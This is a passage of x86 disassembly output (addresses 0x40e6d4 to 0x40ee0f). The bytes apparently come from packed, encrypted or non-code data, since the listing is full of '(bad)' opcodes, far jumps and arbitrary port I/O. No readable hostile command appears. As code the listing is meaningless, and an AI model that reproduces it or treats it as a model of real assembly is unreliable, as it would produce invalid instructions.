  40e6d4:	inc    ebx
  40e6d5:	mov    dh,0xa0
  40e6d7:	mov    esi,0x69bbc2f6
  40e6dc:	arpl   WORD PTR [ebx],cx
  40e6de:	sbb    BYTE PTR [esi],ch
  40e6e0:	cmp    al,0x99
  40e6e2:	(bad)  
  40e6e3:	sahf   
  40e6e4:	pop    eax
  40e6e5:	push   cs
  40e6e6:	sub    esi,DWORD PTR [eax]
  40e6e8:	sahf   
  40e6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ea:	cmp    cl,bh
  40e6ec:	or     DWORD PTR [ebx+ebp*1+0x397b65a7],esi
  40e6f3:	(bad)  
  40e6f4:	shr    al,1
  40e6f6:	inc    edx
  40e6f7:	push   ebp
  40e6f8:	sar    BYTE PTR [ecx-0x7],0x20
  40e6fc:	cli    
  40e6fd:	xor    BYTE PTR [esi-0x48],dh
  40e700:	aad    0xc4
  40e702:	loope  0x40e6af
  40e704:	xchg   ebp,eax
  40e705:	sub    ecx,DWORD PTR [ebp+eax*4+0x60]
  40e709:	mov    ecx,0x6fd0327
  40e70e:	push   cs
  40e70f:	fst    DWORD PTR [esi+esi*4+0x19f9d815]
  40e716:	pop    ds
  40e717:	mov    dl,0xa6
  40e719:	pusha  
  40e71a:	push   ds
  40e71b:	cli    
  40e71c:	pop    esp
  40e71d:	mov    eax,0xaa00c18f
  40e722:	jp     0x40e774
  40e724:	dec    ebx
  40e725:	int    0x88
  40e727:	mov    ds:0x3268fa1b,eax
  40e72c:	cld    
  40e72d:	es enter 0xb2c0,0x51
  40e732:	xchg   BYTE PTR [ebx-0x343e12c8],cl
  40e738:	add    DWORD PTR [edi],ecx
  40e73a:	pop    eax
  40e73b:	hlt    
  40e73c:	push   ebp
  40e73d:	sbb    al,0x7e
  40e73f:	jb     0x40e71b
  40e741:	sub    al,0x9a
  40e743:	and    eax,0x73c11ab
  40e748:	repnz dec edi
  40e74a:	and    BYTE PTR [edi-0x62],dh
  40e74d:	mov    eax,0xe335e0f6
  40e752:	shl    DWORD PTR [ebx+0x2c],1
  40e755:	sub    al,0xb9
  40e757:	out    0xff,al
  40e759:	jecxz  0x40e761
  40e75b:	add    eax,0x4f9e8b77
  40e760:	add    BYTE PTR [ecx],al
  40e762:	stos   DWORD PTR es:[edi],eax
  40e763:	pcmpgtw mm7,QWORD PTR [ecx-0x6b]
  40e767:	mov    ?,WORD PTR [edi+0x3c]
  40e76a:	mov    dh,0xdc
  40e76c:	mov    esp,0xdf6a74f2
  40e771:	xchg   ecx,eax
  40e772:	push   ebp
  40e773:	sbb    bl,ah
  40e775:	dec    edi
  40e776:	into   
  40e777:	shl    BYTE PTR [edi-0x5483b44e],1
  40e77d:	popf   
  40e77e:	xor    al,0x2
  40e780:	lea    esp,[ebp-0x12]
  40e783:	pop    ds
  40e784:	push   cs
  40e785:	pop    edi
  40e786:	stos   DWORD PTR es:[edi],eax
  40e787:	in     eax,dx
  40e788:	push   edi
  40e789:	test   DWORD PTR [edx+0x55467945],0xdfb3f433
  40e793:	and    BYTE PTR [ebp+ebp*2+0x102fd864],bl
  40e79a:	lods   al,BYTE PTR ds:[esi]
  40e79b:	shl    bh,0x15
  40e79e:	mov    ebx,0x589c7b7
  40e7a3:	push   0x15
  40e7a5:	push   edx
  40e7a6:	xor    al,BYTE PTR [ecx+0x13]
  40e7a9:	mov    esp,0x4ea0bd0a
  40e7ae:	fdivr  DWORD PTR [esi-0x60ef32b]
  40e7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b5:	into   
  40e7b6:	cld    
  40e7b7:	mov    al,ds:0xdb0cf8a0
  40e7bc:	rcl    eax,0xac
  40e7bf:	jae    0x40e830
  40e7c1:	(bad)  
  40e7c2:	stc    
  40e7c3:	stc    
  40e7c4:	mov    cl,0x59
  40e7c6:	ret    0x4853
  40e7c9:	rcl    DWORD PTR [esi-0x18],1
  40e7cc:	adc    ch,al
  40e7ce:	dec    eax
  40e7cf:	hlt    
  40e7d0:	jbe    0x40e7bf
  40e7d2:	ds cmp al,0x2
  40e7d5:	std    
  40e7d6:	jmp    0xdfed:0x9addd267
  40e7dd:	pop    ebx
  40e7de:	ins    DWORD PTR es:[edi],dx
  40e7df:	sar    BYTE PTR [ebx],1
  40e7e1:	iret   
  40e7e2:	jo     0x40e7fb
  40e7e4:	mov    al,ds:0x8bd8990e
  40e7e9:	jne    0x40e79a
  40e7eb:	xor    al,dh
  40e7ed:	js     0x40e7a7
  40e7ef:	mov    bh,0x7c
  40e7f1:	xor    BYTE PTR ds:0x8948c3a5,dl
  40e7f7:	test   al,0x59
  40e7f9:	sbb    DWORD PTR [esi+0x26],esp
  40e7fc:	imul   ebx,DWORD PTR [ecx-0x367b214b],0x7ecd00ac
  40e806:	stos   BYTE PTR es:[edi],al
  40e807:	mov    eax,0x5a2310bf
  40e80c:	jge    0x40e85a
  40e80e:	in     al,0x1e
  40e810:	shr    DWORD PTR [esi],cl
  40e812:	rol    al,cl
  40e814:	leave  
  40e815:	add    DWORD PTR [ecx],0x3
  40e818:	test   DWORD PTR [edi+0x2e],esi
  40e81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e81c:	cld    
  40e81d:	bound  edi,QWORD PTR [ebx+0x6c]
  40e820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e821:	into   
  40e822:	mov    bl,0x1d
  40e824:	ret    0x4e7a
  40e827:	bound  ebx,QWORD PTR [edi-0x46af6a29]
  40e82d:	enter  0x551e,0x8d
  40e831:	inc    ecx
  40e832:	cs loopne 0x40e885
  40e835:	pusha  
  40e836:	(bad)  ds:0x4353125d
  40e83c:	test   eax,0xb9f2bc61
  40e841:	ffreep st(6)
  40e843:	clc    
  40e844:	in     al,0x50
  40e846:	fnstsw WORD PTR [esi+0xe16e946]
  40e84c:	mov    dh,0xf6
  40e84e:	(bad)  
  40e84f:	xor    al,BYTE PTR [eax+0x1a]
  40e852:	(bad)  
  40e854:	test   BYTE PTR [edi+esi*1],bh
  40e857:	jmp    0x40e82b
  40e859:	in     eax,0xff
  40e85b:	loop   0x40e8a0
  40e85d:	mov    bl,0x5b
  40e85f:	mov    edx,0xd36509e2
  40e864:	and    edi,DWORD PTR [edi-0x2]
  40e867:	pop    esp
  40e868:	dec    ecx
  40e869:	adc    dh,BYTE PTR [edx+0x43828d23]
  40e86f:	inc    esi
  40e870:	repnz sub DWORD PTR [edi+0x7e4443b6],ecx
  40e877:	hlt    
  40e878:	retf   0xb14f
  40e87b:	fsub   DWORD PTR [ecx+ebp*8]
  40e87e:	add    eax,0x2f62e2c2
  40e883:	dec    esp
  40e884:	inc    esp
  40e885:	jb     0x40e864
  40e887:	loopne 0x40e820
  40e889:	or     eax,DWORD PTR [ebx-0x2be737af]
  40e88f:	cdq    
  40e890:	jle    0x40e910
  40e892:	(bad)  
  40e894:	jp     0x40e82d
  40e896:	mov    cl,BYTE PTR [eax+esi*2]
  40e899:	mov    DWORD PTR [esi+eiz*4-0x40],edi
  40e89d:	lods   al,BYTE PTR ds:[esi]
  40e89e:	jmpw   0xf5b1
  40e8a2:	mov    ah,0xa
  40e8a4:	je     0x40e8b6
  40e8a6:	std    
  40e8a7:	mov    edx,0xbc753666
  40e8ac:	in     eax,dx
  40e8ad:	pushf  
  40e8ae:	push   esi
  40e8af:	inc    ebx
  40e8b0:	xchg   esp,eax
  40e8b1:	mov    edx,0xdc26401d
  40e8b6:	pusha  
  40e8b7:	mov    dl,0xda
  40e8b9:	and    bh,BYTE PTR [ebp*8+0x2cbf83da]
  40e8c0:	out    0xf7,al
  40e8c2:	jnp    0x40e93d
  40e8c4:	in     eax,dx
  40e8c5:	daa    
  40e8c6:	xlat   BYTE PTR ds:[ebx]
  40e8c7:	xchg   edi,eax
  40e8c8:	in     al,dx
  40e8c9:	mov    esi,0x22ce33f0
  40e8ce:	and    eax,0x31b7f658
  40e8d3:	in     eax,0xa8
  40e8d5:	arpl   WORD PTR [esi],cx
  40e8d7:	js     0x40e86d
  40e8d9:	out    dx,eax
  40e8da:	xchg   esp,eax
  40e8db:	add    al,0xde
  40e8dd:	cmp    edx,DWORD PTR [esi+0x3a5baf3a]
  40e8e3:	mov    ebx,0xdaa7fc11
  40e8e8:	jmp    0xda62c5d7
  40e8ed:	lods   eax,DWORD PTR ds:[esi]
  40e8ee:	mov    edi,0x38c37e39
  40e8f3:	inc    edx
  40e8f4:	cld    
  40e8f5:	add    BYTE PTR [esi+0x311038c0],bl
  40e8fb:	mov    ch,0x91
  40e8fd:	or     edi,DWORD PTR [esi]
  40e8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e901:	(bad)  
  40e903:	sub    al,0x1e
  40e905:	cli    
  40e906:	retf   0x5a20
  40e909:	lods   eax,DWORD PTR ds:[esi]
  40e90a:	xchg   edi,eax
  40e90b:	mov    esi,0xb11337de
  40e910:	aaa    
  40e911:	push   ds
  40e912:	mov    ebp,0x9642ab23
  40e917:	cmp    al,0x96
  40e919:	push   edx
  40e91a:	lock push ebx
  40e91c:	cmp    al,0x21
  40e91e:	sbb    al,0xd2
  40e920:	push   ds
  40e921:	and    ecx,DWORD PTR [ecx+0x43b4b4a5]
  40e927:	jmp    0xf2e1:0xc1872a7
  40e92e:	dec    edx
  40e92f:	stos   DWORD PTR es:[edi],eax
  40e930:	(bad)  
  40e931:	and    BYTE PTR [ebx+edi*1+0x4b1e28a3],ah
  40e938:	jmp    0x8482:0xd12c15d3
  40e93f:	lods   al,BYTE PTR ds:[esi]
  40e940:	inc    esp
  40e941:	add    DWORD PTR [edx+0x5b],0x3f
  40e945:	std    
  40e946:	add    al,bl
  40e948:	dec    edi
  40e949:	mov    cl,BYTE PTR [edx+eax*8+0x19]
  40e94d:	mov    es,WORD PTR [esi]
  40e94f:	loope  0x40e976
  40e951:	(bad)  
  40e953:	fstp   DWORD PTR [ecx+0x0]
  40e956:	in     eax,0x28
  40e958:	push   cs
  40e959:	mov    esp,0x8f7d27ad
  40e95e:	and    eax,0xfe8bcdd8
  40e963:	stos   DWORD PTR es:[edi],eax
  40e964:	imul   esp,esp,0xd9951650
  40e96a:	fdivr  QWORD PTR [esi+0x6a]
  40e96d:	cmp    eax,DWORD PTR ds:0x215b50b7
  40e973:	fst    QWORD PTR [esi-0x7e1868b1]
  40e979:	out    dx,eax
  40e97a:	fwait
  40e97b:	mov    ah,0x74
  40e97d:	mov    ebx,0x6c9ba69f
  40e982:	mov    dh,0xf7
  40e984:	mov    ebp,0x90c06542
  40e989:	cs mov dl,0x9e
  40e98c:	sub    cl,BYTE PTR [ebp+0x5708dda0]
  40e992:	adc    ah,al
  40e994:	bound  eax,QWORD PTR [ebx+0x43b174d4]
  40e99a:	and    al,BYTE PTR [ebp-0x1c]
  40e99d:	stos   BYTE PTR es:[di],al
  40e99f:	lea    edi,[edx+edx*8]
  40e9a2:	pop    es
  40e9a3:	sub    ah,bh
  40e9a5:	push   edx
  40e9a6:	pop    ds
  40e9a7:	cmp    DWORD PTR [ecx],ebp
  40e9a9:	jbe    0x40e9b9
  40e9ab:	inc    ebx
  40e9ac:	mov    dl,0x98
  40e9ae:	mov    cl,BYTE PTR [ebx+edi*8-0x31]
  40e9b2:	fidiv  WORD PTR [edx-0x40dcd2c8]
  40e9b8:	retf   
  40e9b9:	jae    0x40ea3a
  40e9bb:	fisubr WORD PTR [esi+0x3867e45a]
  40e9c1:	mov    ah,0x42
  40e9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9c4:	and    eax,0xf0e10bd9
  40e9c9:	das    
  40e9ca:	test   BYTE PTR [esp+esi*8],al
  40e9cd:	push   es
  40e9ce:	jb     0x40ea09
  40e9d0:	(bad)  
  40e9d1:	mov    ebx,0x57ea75e2
  40e9d6:	jae    0x40ea3d
  40e9d8:	(bad)  
  40e9da:	(bad)  [ebp-0x6c]
  40e9dd:	cmc    
  40e9de:	iret   
  40e9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9e0:	jmp    0x3e2ba97a
  40e9e5:	mov    ah,0xd4
  40e9e7:	(bad)  
  40e9e8:	cmp    al,0xa6
  40e9ea:	dec    DWORD PTR ds:0x110295d6
  40e9f0:	xchg   BYTE PTR [esi+0x37c59752],dh
  40e9f6:	sbb    ebp,DWORD PTR [ebp+0xcbcde18]
  40e9fc:	mov    dl,0xdc
  40e9fe:	in     eax,0x9a
  40ea00:	xchg   esp,eax
  40ea01:	mov    WORD PTR [esi],ss
  40ea03:	inc    esi
  40ea04:	shr    bh,cl
  40ea06:	fist   DWORD PTR [esi-0x782412c2]
  40ea0c:	mov    ch,0x1e
  40ea0e:	in     eax,dx
  40ea0f:	cld    
  40ea10:	fld    DWORD PTR [eax+0x78]
  40ea13:	and    eax,0x22f0ca05
  40ea18:	xchg   esi,eax
  40ea19:	push   eax
  40ea1a:	out    dx,al
  40ea1b:	mov    esi,0x8d5b7b45
  40ea20:	dec    eax
  40ea21:	sub    eax,0x2e0d4755
  40ea26:	or     DWORD PTR [edi-0x2495c0bb],ecx
  40ea2c:	xor    al,0x2d
  40ea2e:	aas    
  40ea2f:	add    ecx,esi
  40ea31:	jno    0x40e9ca
  40ea33:	not    DWORD PTR [edx-0x47]
  40ea36:	push   ebp
  40ea37:	mov    es,WORD PTR [ebx+0x34]
  40ea3a:	mov    eax,0x5eec9666
  40ea3f:	adc    DWORD PTR [edi],eax
  40ea41:	xchg   ebp,eax
  40ea42:	retf   0xee55
  40ea45:	rol    dh,cl
  40ea47:	inc    BYTE PTR [esi+0x3571f3ba]
  40ea4d:	mov    cl,0xe8
  40ea4f:	(bad)  
  40ea50:	mov    al,0xee
  40ea52:	pop    ds
  40ea53:	push   esi
  40ea54:	and    DWORD PTR [eax-0x2e60f3d7],esi
  40ea5a:	xchg   esp,eax
  40ea5b:	sbb    al,BYTE PTR [edx]
  40ea5d:	add    al,0x32
  40ea5f:	mov    bl,0xb7
  40ea61:	test   al,0x4a
  40ea63:	xchg   ebx,eax
  40ea64:	mov    al,ds:0xf33a8df8
  40ea69:	aaa    
  40ea6a:	and    esi,DWORD PTR [edx+ecx*2+0x3]
  40ea6e:	les    ebp,FWORD PTR ds:0xe7c3d043
  40ea74:	out    0x2b,eax
  40ea76:	cli    
  40ea77:	or     al,0xee
  40ea79:	test   al,0x2d
  40ea7b:	bound  edi,QWORD PTR [ecx-0x1a75b079]
  40ea81:	ret    
  40ea82:	cdq    
  40ea83:	push   esp
  40ea84:	fild   DWORD PTR [edi+0x7a]
  40ea87:	mov    dh,0x7f
  40ea89:	mov    BYTE PTR [ebp+0x76],bh
  40ea8c:	es int 0x42
  40ea8f:	and    al,0xb9
  40ea91:	jge    0x40ea74
  40ea93:	fist   WORD PTR [edi+ebx*2+0x758657c0]
  40ea9a:	inc    esi
  40ea9b:	fld    QWORD PTR [eax+0x4d]
  40ea9e:	imul   eax,DWORD PTR [esi-0x2],0x6c4bfd23
  40eaa5:	adc    ecx,DWORD PTR [ebp+ebx*2-0x2fde1cbc]
  40eaac:	inc    edi
  40eaad:	outs   dx,DWORD PTR ds:[esi]
  40eaae:	out    dx,eax
  40eaaf:	or     DWORD PTR [ecx],ebx
  40eab1:	repz neg cl
  40eab4:	imul   ecx,DWORD PTR [ebp-0xcc20cb0],0x8b372ec8
  40eabe:	enter  0xad99,0x8a
  40eac2:	fwait
  40eac3:	mov    edx,0xf19f158f
  40eac8:	adc    BYTE PTR [ebx+ebx*8-0x4c267e5d],bl
  40eacf:	imul   edi,DWORD PTR [eax],0x3d
  40ead2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead3:	fidiv  DWORD PTR [edx-0x12]
  40ead6:	arpl   WORD PTR [eax],di
  40ead8:	aam    0x8e
  40eada:	push   cs
  40eadb:	data16 xor cl,BYTE PTR [edx-0x18b4d594]
  40eae2:	fs pop ebx
  40eae4:	jne    0x40eb50
  40eae6:	imul   esp,edi,0xd
  40eae9:	or     edx,DWORD PTR [edx+0x22]
  40eaec:	mov    ecx,0x452aa560
  40eaf1:	push   ds
  40eaf2:	pushf  
  40eaf3:	test   BYTE PTR [eax+0x7d],dh
  40eaf6:	inc    esi
  40eaf7:	pop    edi
  40eaf8:	loop   0x40ea96
  40eafa:	sar    BYTE PTR [ebx-0x56],1
  40eafd:	mov    bh,BYTE PTR [edx+0x3d]
  40eb00:	jb     0x40eb17
  40eb02:	test   BYTE PTR ds:0x3fe0c7b1,dh
  40eb08:	jp     0x40eb88
  40eb0a:	les    ecx,FWORD PTR [ecx]
  40eb0c:	fucom  st(3)
  40eb0e:	dec    edi
  40eb0f:	fistp  QWORD PTR [ecx]
  40eb11:	push   edi
  40eb12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb13:	dec    edi
  40eb14:	dec    DWORD PTR [ebp+esi*4-0x33]
  40eb18:	mov    ebp,0xb4dcc45d
  40eb1d:	jnp    0x40eb33
  40eb1f:	test   BYTE PTR [esi+0x3c6a6361],al
  40eb25:	inc    esp
  40eb26:	jg     0x40eb8a
  40eb28:	inc    esi
  40eb29:	test   al,0x39
  40eb2b:	cmp    eax,0xf1f42f91
  40eb30:	mov    eax,0xe79a37d8
  40eb35:	fimul  DWORD PTR [esp+ebp*4+0x6b]
  40eb39:	adc    BYTE PTR [eax+0xb],dl
  40eb3c:	push   edx
  40eb3d:	repz test eax,0x9c1f363e
  40eb43:	and    bl,BYTE PTR [ebx]
  40eb45:	mov    WORD PTR [ecx-0x2b],?
  40eb48:	ins    DWORD PTR es:[edi],dx
  40eb49:	pop    eax
  40eb4a:	mov    esp,0xc2c67b95
  40eb4f:	jne    0x40ebbe
  40eb51:	daa    
  40eb52:	xchg   esi,eax
  40eb53:	pushf  
  40eb54:	mov    bl,0x6b
  40eb56:	jmp    0xc17b45e9
  40eb5b:	push   edi
  40eb5c:	ret    
  40eb5d:	push   ecx
  40eb5e:	pop    ss
  40eb5f:	push   ebp
  40eb60:	rcl    BYTE PTR [edi+0x70577a92],0xab
  40eb67:	adc    ebx,edi
  40eb69:	xor    esp,0xdac43f9
  40eb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb70:	(bad)  
  40eb71:	neg    ch
  40eb73:	sbb    eax,0x8bd48f04
  40eb78:	cld    
  40eb79:	mov    ds,edi
  40eb7b:	jmp    0xb92e490c
  40eb80:	inc    ebx
  40eb81:	mov    ds:0x274f617a,eax
  40eb86:	xor    ebx,DWORD PTR [eax-0x17]
  40eb89:	cmp    eax,0x11633cc
  40eb8e:	mov    ds:0xa9c513ad,al
  40eb93:	aam    0x4c
  40eb95:	adc    BYTE PTR [edx+0x11],bh
  40eb98:	ins    DWORD PTR es:[edi],dx
  40eb99:	js     0x40eb3e
  40eb9b:	xchg   ebx,eax
  40eb9c:	push   0x48df9b0d
  40eba1:	pop    esi
  40eba2:	sbb    eax,0xecc231d0
  40eba7:	stc    
  40eba8:	(bad)  
  40eba9:	jns    0x40ebf4
  40ebab:	mov    ebp,0x2ba9aa9a
  40ebb0:	push   DWORD PTR [edx]
  40ebb2:	jl     0x40ebca
  40ebb4:	xor    dh,ch
  40ebb6:	retf   0x92ed
  40ebb9:	aam    0xb5
  40ebbb:	stc    
  40ebbc:	jle    0x40ec31
  40ebbe:	sbb    eax,0x3a
  40ebc1:	fmul   QWORD PTR [esi]
  40ebc3:	add    eax,0x143f862f
  40ebc8:	mov    dl,0x71
  40ebca:	push   edx
  40ebcb:	popf   
  40ebcc:	je     0x40eb87
  40ebce:	jns    0x40eb82
  40ebd0:	lock pop ecx
  40ebd2:	addr16 sbb al,0x63
  40ebd5:	aaa    
  40ebd6:	sti    
  40ebd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd8:	xchg   esi,eax
  40ebd9:	hlt    
  40ebda:	jb     0x40eb6f
  40ebdc:	dec    edi
  40ebdd:	and    BYTE PTR [eax],al
  40ebdf:	pop    es
  40ebe0:	pop    ds
  40ebe1:	add    al,BYTE PTR [esi]
  40ebe3:	in     eax,0x72
  40ebe5:	es jae 0x40ec39
  40ebe8:	sbb    DWORD PTR [edi+0x487bb67d],ebx
  40ebee:	std    
  40ebef:	jb     0x40ebaf
  40ebf1:	xor    edi,esi
  40ebf3:	jae    0x40ec56
  40ebf5:	jo     0x40ec60
  40ebf7:	clc    
  40ebf8:	jp     0x40ebaf
  40ebfa:	fucom  st(3)
  40ebfc:	call   0x4e7873d8
  40ec01:	out    0xe6,eax
  40ec03:	stc    
  40ec04:	xchg   ebp,eax
  40ec05:	pusha  
  40ec06:	xchg   esp,eax
  40ec07:	lods   eax,DWORD PTR ds:[esi]
  40ec08:	and    dl,BYTE PTR [ebx]
  40ec0a:	dec    esp
  40ec0b:	dec    esi
  40ec0c:	popf   
  40ec0d:	nop
  40ec0e:	leave  
  40ec0f:	dec    edi
  40ec10:	and    eax,0x216c8837
  40ec15:	mov    ecx,0x18966c8
  40ec1a:	les    eax,FWORD PTR [esi+0x10]
  40ec1d:	aad    0xff
  40ec1f:	and    eax,0x8808de25
  40ec24:	push   edx
  40ec25:	sub    eax,0x8d428de0
  40ec2a:	retf   
  40ec2b:	into   
  40ec2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec2d:	add    DWORD PTR [eax+0x3ecc01d7],0x1f
  40ec34:	cdq    
  40ec35:	test   eax,0x17c1b024
  40ec3a:	mov    edx,0x3df0579a
  40ec3f:	shl    DWORD PTR [ecx],1
  40ec41:	sbb    al,0x4f
  40ec43:	pop    ds
  40ec44:	mov    eax,ds:0xd54ecda3
  40ec49:	push   ecx
  40ec4a:	mov    ecx,0x9c45ca81
  40ec4f:	(bad)  [esi]
  40ec51:	jno    0x40ec5c
  40ec53:	nop
  40ec54:	push   es
  40ec55:	cmp    BYTE PTR [ecx-0x6459c062],bl
  40ec5b:	adc    BYTE PTR [edx+ebx*2-0x18],0xbf
  40ec60:	cli    
  40ec61:	pop    edi
  40ec62:	or     BYTE PTR [edx],ch
  40ec64:	mov    eax,0xc3297d3e
  40ec69:	dec    ebp
  40ec6a:	jae    0x40ebfa
  40ec6c:	sub    bl,BYTE PTR [edi+ecx*8-0x23]
  40ec70:	dec    esp
  40ec71:	jo     0x40ec5a
  40ec73:	jge    0x40ec0c
  40ec75:	je     0x40ebfa
  40ec77:	out    dx,eax
  40ec78:	not    bl
  40ec7a:	std    
  40ec7b:	repnz xor esi,DWORD PTR [edx+ecx*4]
  40ec7f:	jo     0x40ecba
  40ec81:	dec    ebx
  40ec82:	ffreep st(6)
  40ec84:	pop    ds
  40ec85:	in     al,dx
  40ec86:	pop    ebx
  40ec87:	pop    esp
  40ec88:	into   
  40ec89:	lods   eax,DWORD PTR ds:[esi]
  40ec8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec8b:	sub    eax,DWORD PTR [esi+0x498041f6]
  40ec91:	cwde   
  40ec92:	push   ss
  40ec93:	fisubr WORD PTR [edi-0x649494a9]
  40ec99:	mov    ch,0x60
  40ec9b:	outs   dx,DWORD PTR ds:[esi]
  40ec9c:	push   0xffffff80
  40ec9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec9f:	add    eax,0x6e40882d
  40eca4:	arpl   di,si
  40eca6:	jo     0x40ec67
  40eca8:	mov    BYTE PTR [edi],0xa3
  40ecab:	sahf   
  40ecac:	mov    edx,DWORD PTR [ebx+0x32964d2a]
  40ecb2:	jp     0x40ecc4
  40ecb4:	or     bh,BYTE PTR [esi+0x27]
  40ecb7:	mov    ebp,DWORD PTR [ebp+0x7e7f62a2]
  40ecbd:	ror    DWORD PTR [edx],cl
  40ecbf:	and    bh,BYTE PTR [edx+0x3e0a8f4]
  40ecc5:	lods   al,BYTE PTR ds:[esi]
  40ecc6:	data16 aam 0xb1
  40ecc9:	out    dx,eax
  40ecca:	add    al,ah
  40eccc:	lods   al,BYTE PTR ds:[esi]
  40eccd:	add    edx,DWORD PTR [edi-0x7fe87b89]
  40ecd3:	clc    
  40ecd4:	pusha  
  40ecd5:	jp     0x40ed25
  40ecd7:	popa   
  40ecd8:	or     al,0x5b
  40ecda:	aas    
  40ecdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecdc:	sbb    eax,0xa1c401c2
  40ece1:	xchg   edx,eax
  40ece2:	test   DWORD PTR [ecx],ebx
  40ece4:	stc    
  40ece5:	and    DWORD PTR [edi+eiz*8+0x4d],ecx
  40ece9:	cmp    al,ah
  40eceb:	sub    DWORD PTR [ebx+0x46],eax
  40ecee:	mov    dl,0x1f
  40ecf0:	add    eax,0x6fdbd35f
  40ecf5:	bswap  edx
  40ecf7:	or     eax,0x5125b5e1
  40ecfc:	ret    
  40ecfd:	jmp    0xe1d57909
  40ed02:	mov    fs,edi
  40ed04:	fld    st(1)
  40ed06:	(bad)  
  40ed07:	(bad)  
  40ed09:	adc    eax,0x579c9019
  40ed0e:	arpl   WORD PTR [ecx],dx
  40ed10:	addr16 jbe 0x40ecf8
  40ed13:	add    ebp,DWORD PTR [ecx-0x7f]
  40ed16:	adc    esi,DWORD PTR [esi]
  40ed18:	int3   
  40ed19:	dec    ebx
  40ed1a:	dec    eax
  40ed1b:	xchg   edi,eax
  40ed1c:	jmp    0x9bd4:0x42aa9a9b
  40ed23:	or     DWORD PTR [ecx],esi
  40ed25:	inc    esi
  40ed26:	adc    bh,bh
  40ed28:	lea    ecx,[ebp-0x6758b2aa]
  40ed2e:	sbb    al,0x76
  40ed30:	not    DWORD PTR [ebp+0x50]
  40ed33:	cli    
  40ed34:	test   ebx,edi
  40ed36:	call   0x79f9a7ce
  40ed3b:	fucom  st(2)
  40ed3d:	ja     0x40ece2
  40ed3f:	mov    cs,WORD PTR [esi+0x4]
  40ed42:	jge    0x40ed49
  40ed44:	xor    BYTE PTR [esi+0x39],0xf
  40ed48:	outs   dx,BYTE PTR ds:[esi]
  40ed49:	adc    edi,DWORD PTR [ecx+esi*4+0x18]
  40ed4d:	and    ch,BYTE PTR [ecx+ecx*1]
  40ed50:	out    0x18,eax
  40ed52:	popf   
  40ed53:	xor    ebx,edi
  40ed55:	retf   
  40ed56:	add    edi,DWORD PTR [ebx+0x5a]
  40ed59:	fild   QWORD PTR [edx+edx*4+0x63a470bd]
  40ed60:	pop    es
  40ed61:	leave  
  40ed62:	push   ebx
  40ed63:	pop    esi
  40ed64:	fld    DWORD PTR [ecx]
  40ed66:	jg     0x40eddf
  40ed68:	pop    edi
  40ed69:	inc    eax
  40ed6a:	imul   eax,DWORD PTR [eax-0x1e],0x32
  40ed6e:	bound  ebx,QWORD PTR [esi]
  40ed70:	dec    ebx
  40ed71:	rep ins BYTE PTR es:[edi],dx
  40ed73:	into   
  40ed74:	pop    ds
  40ed75:	xchg   BYTE PTR [edi+eiz*1],dl
  40ed78:	xchg   BYTE PTR [eax],bl
  40ed7a:	sbb    DWORD PTR [eax-0x230c0c95],edi
  40ed80:	sub    BYTE PTR [ebp-0x2a],0x21
  40ed84:	cld    
  40ed85:	xchg   ebx,eax
  40ed86:	fiadd  DWORD PTR [edi+0x25]
  40ed89:	pop    ss
  40ed8a:	nop
  40ed8b:	mov    ebx,DWORD PTR [ebp-0x1f]
  40ed8e:	dec    ebp
  40ed8f:	push   es
  40ed90:	push   0xffffff9f
  40ed92:	test   al,0xc
  40ed94:	xor    DWORD PTR [ecx-0x45d3ad8],ecx
  40ed9a:	dec    ebp
  40ed9b:	push   ss
  40ed9c:	push   ecx
  40ed9d:	outs   dx,BYTE PTR ds:[esi]
  40ed9e:	cmp    ecx,esp
  40eda0:	shl    edx,cl
  40eda2:	(bad)  
  40eda3:	leave  
  40eda4:	push   edi
  40eda5:	or     cl,dl
  40eda7:	nop
  40eda8:	mov    esi,0xe9c30b5a
  40edad:	in     eax,0x5a
  40edaf:	xchg   dl,cl
  40edb1:	jge    0x40ed9a
  40edb3:	xchg   esi,eax
  40edb4:	pop    ebx
  40edb5:	add    DWORD PTR [ebp+0x5e51cd0c],edx
  40edbb:	xchg   ebp,eax
  40edbc:	mov    ch,0x6c
  40edbe:	fld    DWORD PTR [edi]
  40edc0:	ret    0x4dfc
  40edc3:	cs cmp eax,0xc4403808
  40edc9:	vcmpss k5,xmm4,(bad),0xe1
  40edcb:	push   ds
  40edcc:	sbb    dl,al
  40edce:	stos   DWORD PTR es:[edi],eax
  40edcf:	mov    cl,0x39
  40edd1:	pop    ds
  40edd2:	dec    esi
  40edd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edd4:	enter  0x734b,0x2
  40edd8:	mov    edi,0x894b64d4
  40eddd:	in     eax,dx
  40edde:	loop   0x40edbf
  40ede0:	cld    
  40ede1:	retf   
  40ede2:	and    eax,0xb1e5f689
  40ede7:	lds    edx,FWORD PTR [eax+0xb]
  40edea:	xchg   esi,eax
  40edeb:	leave  
  40edec:	inc    ebx
  40eded:	jle    0x40edb9
  40edef:	aad    0x7e
  40edf1:	repnz xchg esp,eax
  40edf3:	push   edx
  40edf4:	jp     0x40ee55
  40edf6:	leave  
  40edf7:	jecxz  0x40edfe
  40edf9:	mov    dh,0x1a
  40edfb:	pop    esp
  40edfc:	sbb    DWORD PTR [edx+eiz*1],edi
  40edff:	xor    BYTE PTR [edi+0x6b85a50b],al
  40ee05:	sbb    edx,DWORD PTR [eax+0x5f]
  40ee08:	mov    esp,0xd64353fb
  40ee0d:	pop    eax
  40ee0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee0f:	cs call 0xda1:0xbe565d5e
